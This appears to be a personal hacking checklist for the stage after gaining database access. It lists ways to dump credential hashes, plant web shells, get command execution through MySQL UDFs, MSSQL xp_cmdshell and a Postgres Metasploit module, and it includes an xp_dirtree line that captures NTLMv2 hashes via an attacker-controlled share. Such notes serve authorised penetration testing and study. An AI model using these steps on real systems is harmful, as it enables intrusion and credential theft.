# got access to databases - general SQL
- dump creds / hashes
- dump hashes of database users `mysql.users`
- command execution
  - write web shell directly into outfile - may return SQL error but still write file
  - code execution built into database or with modules
  - write config backups with web shells embedded in data
  - edit user hashes authenticate for auth RCE
  - servers running as root
  - mysql -> raptor udf2 command exec
    - mysql GRANT OPTION -> grant file permissions
  - mssql -> enable `xp_commandshell`
  - Postgres 9.3+ auth RCE -> msf `multi/postgres/postgres_copy_from_program_cmd_exec`
- read files
- check if DBA -> enable access to files / commands
- target DBA or privileged user for file write or RCE
- see what other databases are accessable
- CMS database looking for foothold -> possible extra enumeration
  - installed plugins
  - data -> hidden posts, secrets, creds in messages
- mssql + SQLi
  - stacked queries common
  - `xp_commandshell`
  - capture NTLMv2 hashes `EXEC xp_dirtree '\\attacker.ip\share'`

` zet/20221003151204/README.md `

# Related

- [20221014185603](/zet/20221014185603/README.md) kb file named kb/hacking/to-try-lists/got-access-to-databases-general-SQL.md
- [20221003150751](/zet/20221003150751/README.md) kerbrute password spray users from user list file
- [20221003150985](/zet/20221003150985/README.md) mariadb mysql SQLi union injection
- [20221003151233](/zet/20221003151233/README.md) mysql mariadb write UDF shell or any binary file with file permissions
- [20221003151232](/zet/20221003151232/README.md) mysql mariadb exploit GRANT OPTION to grant file write permissions to self
- [20221003150257](/zet/20221003150257/README.md) h2 database on tcp port 8082
- [20221003150436](/zet/20221003150436/README.md) webshells for all sorts of languages
- [20221003151055](/zet/20221003151055/README.md) get windows verison info from file read
- [20221003151059](/zet/20221003151059/README.md) locations where authenticated users can write in windows
- [20221009102436](/zet/20221009102436/README.md) hacking to try lists
- [20221003151285](/zet/20221003151285/README.md) postgres cannot find table name
- [20221003151236](/zet/20221003151236/README.md) mysql mariadb
- [20221003151192](/zet/20221003151192/README.md) HTTP to try list
- [20221003151188](/zet/20221003151188/README.md) HTTP found CMS
- [20221003150988](/zet/20221003150988/README.md) mariadb mysql
- [20221003150987](/zet/20221003150987/README.md) mariadb mysql SQLi
- [20221003150984](/zet/20221003150984/README.md) mariadb mysql SQLi information tables
- [20221003150983](/zet/20221003150983/README.md) mariadb mysql files
- [20221003150981](/zet/20221003150981/README.md) mariadb mysql files read
- [20221003150980](/zet/20221003150980/README.md) mariadb mysql files write
- [20221003150979](/zet/20221003150979/README.md) mariadb mysql files read database users
- [20221003150829](/zet/20221003150829/README.md) postgres sql enumeration list
- [20221003150826](/zet/20221003150826/README.md) postgres sql enumeration exit
- [20221003150380](/zet/20221003150380/README.md) oracle database attacking tool odat

Tags:

    #to-try-list #database #hacking
